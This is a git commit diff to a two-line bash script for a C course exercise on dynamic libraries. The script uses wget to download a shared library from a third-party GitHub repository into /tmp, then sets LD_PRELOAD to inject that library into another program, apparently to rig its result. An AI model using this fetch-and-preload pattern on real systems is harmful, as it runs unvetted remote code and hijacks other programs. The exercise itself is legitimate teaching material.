1d9a2f916292ba269a3d8cb5515d4d2c2e2d236b
Yabs Mullo <yabsmullo0@gmail.com>
2023-08-21 00:27:52 -0700

    0x18. C - Dynamic libraries

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -O /tmp/libinjection.so https://github.com/BennettDixon/holbertonschool-low_level_programming/raw/master/0x17-dynamic_libraries/libinjection.so
-export LD_PRELOAD=/tmp/libinjection.so
+wget -O /tmp/libdynamic.so https://github.com/buya25/alx-low_level_programming/tree/master/0x18-dynamic_libraries/libdynamic.so
+export LD_PRELOAD=/tmp/libdynamic.so
